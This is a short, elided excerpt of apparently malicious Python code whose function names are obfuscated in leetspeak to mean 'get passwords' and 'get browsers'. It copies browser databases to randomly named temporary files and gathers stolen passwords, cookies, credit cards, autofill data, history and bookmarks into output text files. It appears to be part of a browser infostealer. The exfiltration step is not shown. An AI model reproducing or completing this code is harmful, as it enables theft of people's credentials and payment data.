...
def G37P455W(path, arg):
    try:
        ...
        tempfold = temp + "alka" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
...
def G378r0W53r5(br0W53rP47H5):
    ...
    for file in ["alkapasswords.txt", "alkacookies.txt", "alkacreditcards.txt", "alkaautofills.txt", "alkahistories.txt", "alkabookmarks.txt"]:
